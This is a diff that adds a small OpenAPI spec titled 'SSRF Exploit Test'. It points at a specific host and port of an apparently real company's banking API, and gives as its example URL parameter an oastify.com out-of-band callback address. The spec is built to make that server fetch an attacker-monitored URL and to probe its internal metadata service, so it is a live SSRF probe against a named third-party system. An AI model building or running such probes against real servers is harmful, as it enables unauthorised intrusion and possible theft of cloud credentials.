@@ -1,0 +1,23 @@
+openapi: "3.0.0"
+info:
+  title: SSRF Exploit Test
+  version: "1.0.0"
+paths:
+  /example:
+    get:
+      summary: "Test SSRF by requesting internal metadata service"
+      parameters:
+        - name: url
+          in: query
+          required: true
+          description: "The URL to be requested internally"
+          schema:
+            type: string
+            example: "http://57ads9seym89uvawwaohbztjbah15xtm.oastify.com"
+      responses:
+        '200':
+          description: "Successfully fetched metadata"
+        '404':
+          description: "Could not fetch metadata"
+servers:
+  - url: "http://au-cdrbanking-pub.wise.com:10101"
